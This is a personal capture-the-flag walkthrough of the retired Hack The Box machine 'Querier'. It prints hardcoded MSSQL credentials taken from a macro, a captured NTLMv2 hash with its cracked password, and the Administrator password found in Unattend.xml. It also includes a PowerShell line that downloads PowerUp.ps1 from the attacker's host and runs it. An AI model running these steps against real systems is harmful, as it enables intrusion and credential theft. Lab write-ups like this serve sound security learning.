# Querier Walkthrough
Name: Querier
Date:  16/09/2022
Difficulty:  Medium
Goals:  Ippsec Save my terrible week! 
	- More Database
	- Nishang + PowerUp usage - not used them in ages.
Learnt:
- bit of mssql  
- idiot checklist database + windows -> responder hash callback
- Expanding my Windows PrivEsc Script horizons 

[Ippsec Querier Video](https://www.youtube.com/watch?v=d7ACjty4m7U)

## Recon
The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Querier/Screenshots/ping.png)

No UDP 
Tried snmp-check

![](windows-version.png)

Smbmap -u anonymous did not work but smbclient does

![](smbclientistbetter.png)
guest seems to work for me

![444](smbmapshowspermissions.png)

Macro is in the "m"

![](macrointhem.png)

## Foothold

`oletools` is not supported by Kali anymore, but still works with pip [[olevba-currency-volume-report-xlsm]] for full.

```vb
Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```

![](mssql.png)


![](mssqlversion.png)

## Exploit



```
[SMB] NTLMv2-SSP Client   : 10.129.41.170
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:d772972d44df3628:595DBA42D648A1EE2A49C788F0154DE3:01010000000000000072921BDCC9D8016129C5FCEAFEB1C70000000002000800370055005A00310001001E00570049004E002D004F0041005A005800550059005300560043004B00520004003400570049004E002D004F0041005A005800550059005300560043004B0052002E00370055005A0031002E004C004F00430041004C0003001400370055005A0031002E004C004F00430041004C0005001400370055005A0031002E004C004F00430041004C00070008000072921BDCC9D80106000400020000000800300030000000000000000000000000300000E7E5AD339C15439B03656FDDCE77FC2E6F3D704585029CF74CA2C018B7530D190A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0036003700000000000000000000000000
```

![](cracked.png)

`corporate568`

![444](recursive-smbmap.png)

![777](ce-on-mssql-account.png)

![1000](shell.png)

![](systeminfo.png)

## PrivEsc

Used PowerUp.ps1

```powershell
# Obtain powershell reverse shell on then execute powershell 
IEX(New-Object Net.WebClient).downloadString('http://$ip/PowerUp.ps1')
Invoke-AllChecks
```

![](invokeallchecks1.png)

Unattend.xml contains credentials: `MyUnclesAreMarioAndLuigi!!1!`, so just psexec into the box as Administrator.
![](psexecasnephew.png)





      
